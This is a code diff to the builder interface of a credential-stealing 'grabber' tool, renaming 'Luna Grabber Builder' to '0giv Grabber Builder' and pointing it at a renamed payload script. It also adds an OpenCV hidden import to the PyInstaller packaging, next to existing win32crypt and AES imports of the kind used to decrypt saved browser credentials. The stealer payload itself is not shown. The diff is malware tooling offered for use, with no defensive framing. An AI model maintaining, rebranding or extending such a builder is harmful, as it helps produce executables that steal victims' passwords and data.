@@ -18,7 +18,7 @@ class App(customtkinter.CTk):
     def __init__(self):
         super().__init__()
 
-        self.title("Luna Grabber Builder")
+        self.title("0giv Grabber Builder")
         self.geometry("1000x550")
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure(1, weight=1)
@@ -48,21 +48,21 @@ class App(customtkinter.CTk):
 
         image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
         self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
-        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(60, 60))
-        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(500, 150))
-        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(20, 20))
+        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "0giv.png")), size=(60, 60))
+        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "0giv.png")), size=(500, 150))
+        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "0giv.png")), size=(20, 20))
         self.dashboard_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "home.png")), size=(30, 30))
         self.docs_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "clipboard.png")), size=(30, 30))
         self.help_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
         self.font = "Supernova"
         self.iconpath = None
-        self.iconbitmap(f"{image_path}luna.ico")
+        self.iconbitmap(f"{image_path}0giv.ico")
 
         self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
         self.navigation_frame.grid(row=0, column=0, sticky="nsew")
         self.navigation_frame.grid_rowconfigure(4, weight=1)
 
-        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  Luna Grabber Builder", image=self.logo_image,
+        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  0giv Grabber Builder", image=self.logo_image,
                                                              compound="left", font=customtkinter.CTkFont(size=15, weight="bold", family=self.font))
         self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)
 
@@ -402,7 +402,7 @@ class App(customtkinter.CTk):
             return get_file_name
 
     def get_config(self):
-        with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
+        with open(self.basefilepath + "\\0giv.py", 'r', encoding="utf-8") as f:
             code = f.read()
 
         config_regex = r"__CONFIG__\s*=\s*{(.*?)}"
@@ -410,7 +410,7 @@ class App(customtkinter.CTk):
         if config_match:
             config = config_match.group(0)
         else:
-            raise Exception("Could not find config in luna.py")
+            raise Exception("Could not find config in 0giv.py")
 
         copy_dict = copy.deepcopy(self.updated_dictionary)
         config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
@@ -451,6 +451,7 @@ class App(customtkinter.CTk):
                             "--hidden-import", "Cryptodome.Cipher",
                             "--hidden-import", "Cryptodome.Cipher.AES",
                             "--hidden-import", "win32crypt",
+                            "--hidden-import", "cv2",
                             "--icon", exeicon, f"./{filename}.py"])
 
         elif filetype == "cxfreeze":
